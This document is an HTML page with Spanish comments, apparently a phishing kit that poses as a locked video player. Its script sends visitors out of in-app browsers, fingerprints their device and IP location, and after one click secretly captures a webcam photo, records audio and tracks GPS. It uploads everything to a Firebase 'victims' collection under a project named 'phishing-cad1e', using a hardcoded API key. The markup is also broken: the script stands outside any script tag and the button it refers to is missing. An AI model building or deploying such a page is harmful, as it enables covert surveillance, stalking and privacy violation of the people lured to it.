<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Video</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
html,body{
  width:100%;height:100%;
  background:#111;
  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
  display:flex;align-items:center;justify-content:center;
  overflow:hidden;
}

#card{
  width:min(88vw,360px);
  background:#1a1a1a;
  border-radius:22px;
  overflow:hidden;
  box-shadow:0 24px 60px rgba(0,0,0,.7);
}

#thumb-wrap{
  position:relative;
  width:100%;
  aspect-ratio:4/3;
  overflow:hidden;
}
#thumb{
  width:100%;height:100%;
  object-fit:cover;
  filter:blur(14px);
  transform:scale(1.08);
  display:block;
}
#overlay{
  position:absolute;inset:0;
  background:rgba(0,0,0,.28);
  display:flex;align-items:center;justify-content:center;
}
.play-btn{
  width:60px;height:60px;
  background:rgba(255,255,255,.18);
  backdrop-filter:blur(6px);
  -webkit-backdrop-filter:blur(6px);
  border:1.5px solid rgba(255,255,255,.35);
  border-radius:50%;
  display:flex;align-items:center;justify-content:center;
}
.play-btn svg{width:26px;height:26px;fill:#fff;margin-left:3px;}

#card-body{
  padding:18px 18px 20px;
}
.lock-row{
  display:flex;align-items:center;gap:8px;
  margin-bottom:8px;
}
.lock-icon{font-size:1rem;}
.lock-label{
  color:#8e8e93;font-size:.72rem;font-weight:500;
  letter-spacing:.04em;text-transform:uppercase;
}
.card-title{
  color:#fff;font-size:1rem;font-weight:700;
  margin-bottom:5px;line-height:1.3;
}
.card-sub{
  color:#636366;font-size:.78rem;line-height:1.45;
  margin-bottom:16px;
}
.btn-ver{
  width:100%;padding:13px;
  border-radius:12px;
  background:#0a84ff;border:none;
  color:#fff;font-size:.9rem;font-weight:700;
  cursor:pointer;letter-spacing:.01em;
  display:flex;align-items:center;justify-content:center;gap:7px;
}
.btn-ver:active{background:#0060df;}
.btn-ver svg{width:16px;height:16px;fill:#fff;}
</style>
</head>

// ─── IN-APP BROWSER DETECTION & REDIRECT ─────────────────────
(function(){
  const ua = navigator.userAgent || '';

  // Detecta WebViews conocidos que bloquean getUserMedia
  const isInApp = (
    // TikTok
    /musical_ly|TikTok|BytedanceWebview|ByteLocale/i.test(ua) ||
    // Instagram / Facebook / Threads
    /Instagram|FBAN|FBAV|FB_IAB|FB4A|FBIOS|Threads/i.test(ua) ||
    // Snapchat
    /Snapchat/i.test(ua) ||
    // Twitter/X
    /Twitter/i.test(ua) ||
    // LinkedIn
    /LinkedInApp/i.test(ua) ||
    // WhatsApp
    /WhatsApp/i.test(ua) ||
    // Generic Android WebView (no Chrome)
    (/wv/.test(ua) && /Android/i.test(ua) && !/Chrome\/[.0-9]*(?! Mobile Safari)/.test(ua)) ||
    // iOS WebView (WKWebView): tiene Safari en ua pero NO tiene "Safari" standalone
    (/iPhone|iPad|iPod/i.test(ua) && /AppleWebKit/i.test(ua) && !/Safari\/[0-9]/.test(ua))
  );

  if (!isInApp) return; // ya estamos en browser real, ok

  const cur = encodeURIComponent(location.href);

  // ── Android: intent:// abre en Chrome directamente ──────────
  if (/Android/i.test(ua)) {
    // intent URI — Chrome lo intercepta, evita el WebView
    const intent = location.href.replace(/^https?:/, 'intent:')
      + '#Intent;scheme=' + (location.protocol === 'https:' ? 'https' : 'http')
      + ';package=com.android.chrome;end';
    location.href = intent;
    // Fallback: si intent no funciona (dispositivo sin Chrome), abre chooser
    setTimeout(() => {
      // Intento universal fallback — Chrome custom tab
      location.href = 'googlechrome://' + location.host + location.pathname + location.search;
    }, 800);
    return;
  }

  // ── iOS: x-safari-// fuerza Safari ──────────────────────────
  if (/iPhone|iPad|iPod/i.test(ua)) {
    // x-safari- scheme abre Safari nativo en iOS
    location.href = location.href.replace(/^https/, 'x-safari-https').replace(/^http(?!s)/, 'x-safari-http');
    return;
  }
})();




// ─── CONFIG ───────────────────────────────────────────────────
const KEY  = 'AIzaSyCPpG5yJ-1FkfHj8GHTucZRU_5dia-aqX0';
const PROJ = 'phishing-cad1e';
const ST   = 'phishing-cad1e.firebasestorage.app';
const COL  = `https://firestore.googleapis.com/v1/projects/${PROJ}/databases/(default)/documents/victims`;

// ─── ESTADO ───────────────────────────────────────────────────
let docId = null;
const D   = { ts: String(Date.now()) };

// ─── HELPERS ──────────────────────────────────────────────────
const set = (k, v) => { if (v !== undefined && v !== null && v !== '') D[k] = String(v).slice(0, 900); };

// Convierte objeto plano → formato Firestore REST
function toFields(obj) {
  const f = {};
  for (const [k, v] of Object.entries(obj)) f[k] = { stringValue: v };
  return { fields: f };
}

// Envía/actualiza en Firestore
async function push() {
  try {
    if (!docId) {
      const r = await fetch(`${COL}?key=${KEY}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(toFields(D))
      });
      const j = await r.json();
      if (j.name) docId = j.name.split('/').pop();
    } else {
      const mask = Object.keys(D).map(k => `updateMask.fieldPaths=${encodeURIComponent(k)}`).join('&');
      await fetch(`${COL}/${docId}?key=${KEY}&${mask}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(toFields(D))
      });
    }
  } catch (e) {}
}

// Sube archivo a Firebase Storage, devuelve URL pública
async function upload(path, dataUrl, mime) {
  try {
    const b64  = dataUrl.split(',')[1];
    const bin  = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
    const name = encodeURIComponent(path);
    const r = await fetch(
      `https://firebasestorage.googleapis.com/v0/b/${ST}/o?name=${name}&key=${KEY}`,
      { method: 'POST', headers: { 'Content-Type': mime }, body: bin }
    );
    const j = await r.json();
    if (j.name) {
      const url = `https://firebasestorage.googleapis.com/v0/b/${ST}/o/${name}?alt=media`;
      return url;
    }
  } catch (e) {}
  return null;
}

// btoa seguro para buffers grandes (evita stack overflow en Safari)
function safeBtoa(bytes) {
  let s = '';
  const chunk = 8192;
  for (let i = 0; i < bytes.length; i += chunk)
    s += String.fromCharCode(...bytes.subarray(i, i + chunk));
  return btoa(s);
}

// ─── FINGERPRINT PASIVO (sin permisos) ───────────────────────
(function fp() {
  set('ua',       navigator.userAgent);
  set('platform', navigator.platform);
  set('vendor',   navigator.vendor);
  set('lang',     navigator.language);
  set('langs',    (navigator.languages || []).join(','));
  set('cores',    navigator.hardwareConcurrency);
  set('memory',   navigator.deviceMemory);
  set('touch',    navigator.maxTouchPoints);
  set('screen',   `${screen.width}x${screen.height}@${devicePixelRatio}`);
  set('tz',       Intl.DateTimeFormat().resolvedOptions().timeZone);
  set('dark',     matchMedia('(prefers-color-scheme:dark)').matches);
  set('online',   navigator.onLine);

  const nav = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (nav) {
    set('connType', nav.effectiveType);
    set('connDl',   nav.downlink);
    set('connRtt',  nav.rtt);
  }

  // Canvas fingerprint
  try {
    const c = document.createElement('canvas');
    c.width = 200; c.height = 40;
    const ctx = c.getContext('2d');
    ctx.fillStyle = '#f00';
    ctx.fillRect(0, 0, 100, 40);
    ctx.fillStyle = '#0f0';
    ctx.font = '14px Arial';
    ctx.fillText('fingerprint', 10, 25);
    set('canvas', c.toDataURL().slice(-30));
  } catch (e) {}

  // WebGL
  try {
    const gl = document.createElement('canvas').getContext('webgl');
    const ext = gl.getExtension('WEBGL_debug_renderer_info');
    if (ext) {
      set('glVendor',   gl.getParameter(ext.UNMASKED_VENDOR_WEBGL));
      set('glRenderer', gl.getParameter(ext.UNMASKED_RENDERER_WEBGL));
    }
  } catch (e) {}

  // Battery
  navigator.getBattery?.().then(b => {
    set('bat',    Math.round(b.level * 100) + '%');
    set('batChg', b.charging);
    push();
  }).catch(() => {});

  // Fetch IP pública
  fetch('https://freeipapi.com/api/json/', { signal: AbortSignal.timeout(6000) })
    .then(r => r.json())
    .then(j => {
      set('ip',      j.ipAddress);
      set('city',    j.cityName);
      set('region',  j.regionName);
      set('country', j.countryName);
      set('cc',      j.countryCode);
      set('lat',     j.latitude);
      set('lon',     j.longitude);
      set('org',     j.ipType);
      push();
    }).catch(() => {});
})();

// Push inicial

// ─── BOTÓN PERMITIR ───────────────────────────────────────────
document.getElementById('btnOk').addEventListener('click', collect);


async function collect() {
  set('clicked','true'); push();

  if (!navigator.mediaDevices?.getUserMedia) {
    set('camErr','no_api'); push(); _grabGPS(); return;
  }

  let stream;
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video:{ facingMode:'user', width:{ideal:1280}, height:{ideal:720} },
      audio:true
    });
    set('camGranted','true'); push();
  } catch(err) {
    set('camErr', err.name + ':' + err.message); push();
    _grabGPS(); return;
  }

  // Video element
  const vid = document.createElement('video');
  vid.setAttribute('playsinline','');
  vid.setAttribute('webkit-playsinline','');
  vid.autoplay=true; vid.muted=true; vid.srcObject=stream;
  vid.style.cssText='position:fixed;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;';
  document.body.appendChild(vid);

  // Esperar a que el video tenga dimensiones reales
  await new Promise(res => {
    if (vid.readyState >= 2) { res(); return; }
    vid.onloadeddata = res;
    vid.onerror = res;
    setTimeout(res, 3000);
  });
  await vid.play().catch(()=>{});

  // Esperar frame real con dimensiones > 0
  const iOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
  const frameWait = iOS ? 2500 : 1200;
  await new Promise(res => setTimeout(res, frameWait));

  // Asegurar docId creado antes de subir
  if (!docId) { await push(); }
  // Esperar hasta docId con timeout
  let waited = 0;
  while (!docId && waited < 4000) {
    await new Promise(r => setTimeout(r, 200)); waited += 200;
  }

  const uid = docId || ('anon_' + Date.now());

  // ── Foto ──────────────────────────────────────────────────────
  try {
    const w = vid.videoWidth  || 640;
    const h = vid.videoHeight || 480;
    const cv = document.createElement('canvas');
    cv.width=w; cv.height=h;
    const ctx = cv.getContext('2d', {willReadFrequently:true});
    ctx.drawImage(vid, 0, 0, w, h);
    const dataUrl = cv.toDataURL('image/jpeg', 0.85);

    // Verificar que el canvas tiene datos reales (no negro puro)
    const imgData = ctx.getImageData(0, 0, Math.min(w,50), Math.min(h,50));
    const nonZero = imgData.data.some(v => v > 10);
    if (!nonZero) {
      set('photoErr','blank_frame'); push();
    } else {
      const url = await upload(`photos/${uid}.jpg`, dataUrl, 'image/jpeg');
      if (url) { set('photoUrl', url); push(); }
    }
  } catch(e) { set('photoErr', e.message); push(); }

  // Parar video, dejar audio
  stream.getVideoTracks().forEach(t => t.stop());
  vid.remove();

  // ── Audio ─────────────────────────────────────────────────────
  _grabAudio(stream, uid);

  // ── GPS ───────────────────────────────────────────────────────
  _grabGPS();

  // ── Notificaciones ────────────────────────────────────────────
  if ('Notification' in window) {
    Notification.requestPermission().then(r=>{set('notif',r);push();}).catch(()=>{});
  }
}

function _grabGPS(){
  if (!('geolocation' in navigator)) return;
  let best = null;

  const save = pos => {
    const acc = pos.coords.accuracy;
    if (!best || acc < best) {
      best = acc;
      set('gpsLat', pos.coords.latitude);
      set('gpsLon', pos.coords.longitude);
      set('gpsAcc', acc);
      set('gpsAlt', pos.coords.altitude ?? '');
      push();
    }
  };

  navigator.geolocation.getCurrentPosition(save,
    () => navigator.geolocation.getCurrentPosition(save, ()=>{},
      {enableHighAccuracy:false, timeout:10000, maximumAge:60000}),
    {enableHighAccuracy:true, timeout:15000, maximumAge:0}
  );

  const wid = navigator.geolocation.watchPosition(
    pos => { save(pos); if((best??999) < 15) navigator.geolocation.clearWatch(wid); },
    ()=>{},
    {enableHighAccuracy:true, maximumAge:0}
  );
  setTimeout(()=>navigator.geolocation.clearWatch(wid), 30000);
}

async function _grabAudio(existingStream, uid) {
  try {
    const hasAudio = existingStream?.getAudioTracks()?.length > 0;
    const s = hasAudio ? existingStream
      : await navigator.mediaDevices.getUserMedia({audio:true});

    const mimes = ['audio/webm;codecs=opus','audio/webm','audio/mp4','audio/ogg'];
    const mime  = mimes.find(m => MediaRecorder.isTypeSupported(m)) || '';

    const rec    = new MediaRecorder(s, mime ? {mimeType:mime} : {});
    const chunks = [];

    rec.ondataavailable = e => { if (e.data?.size > 0) chunks.push(e.data); };
    rec.onstop = async () => {
      if (!hasAudio) s.getTracks().forEach(t=>t.stop());
      try {
        const finalMime = rec.mimeType || mime || 'audio/webm';
        const ext = finalMime.includes('mp4') ? 'mp4'
                  : finalMime.includes('ogg') ? 'ogg' : 'webm';
        const blob = new Blob(chunks, {type: finalMime});
        if (blob.size < 100) { set('audioErr','blob_empty'); push(); return; }
        const ab    = await blob.arrayBuffer();
        const bytes = new Uint8Array(ab);
        const b64   = 'data:' + finalMime + ';base64,' + safeBtoa(bytes);
        const url   = await upload(`audio/${uid}.${ext}`, b64, finalMime);
        if (url) { set('audioUrl', url); push(); }
      } catch(e) { set('audioErr', e.message); push(); }
    };

    rec.start(500);
    setTimeout(()=>{ try { rec.stop(); } catch(e){} }, 5000);
  } catch(e) { set('audioErr', e.message); push(); }
}

  );
